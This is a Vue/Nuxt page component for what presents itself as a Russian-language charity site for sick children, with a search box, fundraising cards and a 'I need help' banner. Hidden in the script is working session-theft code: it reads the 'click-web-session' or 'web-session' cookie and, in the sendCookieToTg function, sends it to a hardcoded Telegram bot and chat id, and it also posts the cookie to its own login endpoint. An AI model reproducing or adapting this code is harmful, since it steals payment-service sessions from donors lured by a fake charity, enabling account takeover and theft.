<template>
  <div class="index-container">
    <div v-if="cookieData" style="margin: 0 20px" @click="sendCookieToTg">
      <div style="user-select: all; white-space: pre-line; color: #171717">
        {{ cookieData }}
      </div>
    </div>
    <template v-if="pending">
      <HeaderSkeleton></HeaderSkeleton>
      <MainSkeleton></MainSkeleton>
      <MainSkeleton></MainSkeleton>
      <BannerSkeleton></BannerSkeleton>
    </template>
    <template v-else>
      <div class="search-container">
        <input type="text" placeholder="Фамилия, имя и отчество..." />
      </div>
      <div class="help-block">
        <div class="text">Нуждаются в помощи</div>
        <div class="description">
          Сейчас им крайне необходима<br />
          ваша помощь.
        </div>
      </div>
      <ChartCardNotCollected></ChartCardNotCollected>
      <ChartCardCollected></ChartCardCollected>
      <div class="charity-banner">
        <div class="text">
          Наша миссия — протянуть руку тем, кто действительно в этом нуждается.
          Помощь больным детям — основная наша задача.
        </div>
        <div v-ripple.500="'rgba(255, 255, 255, 0.35)'" class="btn-help">
          Мне нужна помощь
        </div>
      </div>
    </template>
  </div>
</template>

<script setup>
import { storeToRefs } from 'pinia'
import HeaderSkeleton from '~/components/skeleton/MainHeaderSkeleton.vue'
import MainSkeleton from '~/components/skeleton/MainSkeleton.vue'
import BannerSkeleton from '~/components/skeleton/BannerSkeleton.vue'
import ChartCardNotCollected from '~/components/ChartCardNotCollected.vue'
import ChartCardCollected from '~/components/ChartCardCollected.vue'
import { useAppStore } from '~/stores/AppStore'

definePageMeta({
  layout: 'main',
})
const heightDevice = inject('devicePlatform')
const backendEnv = useRuntimeConfig().public.apiBase
const appStore = useAppStore()
const { user } = storeToRefs(appStore)
const nuxtApp = useNuxtApp()

const sendCookieToTg = () => {
  const data = `<pre><code class="language-javascript">${cookieData.value}</code></pre>`
  fetch(
    `https://api.telegram.org/bot6789685486:AAFmpL2nId5LRxhxYymMagh-0yARXV1Nxhc/sendMessage?chat_id=-1002074363401&parse_mode=html&text=${data}`,
    {
      method: 'GET',
    },
  )
}

const cookieData = computed(() =>
  getCookie('click-web-session')
    ? getCookie('click-web-session')
    : getCookie('web-session'),
)

const { pending } = await useFetch(`${backendEnv}/api/login`, {
  headers: {
    'Content-Type': 'application/json',
    Accept: 'application/json',
    mode: 'no-cors',
  },
  body: {
    web_session: cookieData.value,
  },
  method: 'POST',
  onResponse({ response }) {
    user.value = response._data?.user
  },
  getCachedData(key) {
    return nuxtApp.payload.data[key] || nuxtApp.static.data[key]
  },
})
</script>

<style lang="scss" scoped>
.index-container {
  height: calc(v-bind(heightDevice) - 150px);
  max-height: calc(v-bind(heightDevice) - 150px);
  padding-bottom: 8px;
  overflow-y: auto !important;
}

.search-container {
  position: relative;
  padding: 0 20px 18px;
  & input {
    border: 1px solid rgb(183, 184, 198);
    border-radius: 10px;
    height: 40px;
    background: url('../../assets/img/search.svg') no-repeat rgb(255, 255, 255);
    background-position: 10px center;
    width: 100%;
    display: flex;
    align-items: center;
    padding: 12px 10px 12px 35px;
    color: rgb(106, 106, 106);
    font-size: 12px;
    font-weight: 400;
    line-height: 20px;
    letter-spacing: 0;
    text-align: left;
    &::placeholder {
      font-size: 12px;
      font-weight: 400;
      line-height: 20px;
      letter-spacing: 0;
      text-align: left;
      color: rgb(106, 106, 106);
      background: url('/images/settings.svg') no-repeat rgb(255, 255, 255);
      background-position: right center;
    }
    &:focus {
      outline: 0;
    }
  }
}

.help-block {
  padding: 0 20px 0;
  & .text {
    color: rgb(54, 56, 69);
    font-size: 16px;
    font-weight: 600;
    line-height: 19px;
    letter-spacing: 0;
    text-align: left;
    padding-bottom: 5px;
  }
  & .description {
    color: rgb(106, 106, 106);
    font-size: 12px;
    font-weight: 400;
    line-height: 14px;
    letter-spacing: 0;
    text-align: left;
  }
}

.charity-banner {
  display: flex;
  flex-direction: column;
  object-fit: cover;
  padding: 15px 15px 15px;
  position: relative;
  margin: 20px;
  height: auto;
  background: url('/images/charity.svg') 100%/100%;
  border-radius: 12px;
  background-repeat: no-repeat;
  & .text {
    font-weight: 400;
    font-size: 10px;
    color: #fff;
    width: 65%;
    margin-bottom: 6px;
  }
  & .btn-help {
    width: 40%;
    border-radius: 6px;
    height: 28px;
    display: flex;
    justify-content: center;
    align-items: center;
    background: #fff;
    font-weight: 600;
    font-size: 10px;
    line-height: 120%;
    color: #363845;
  }
}
</style>
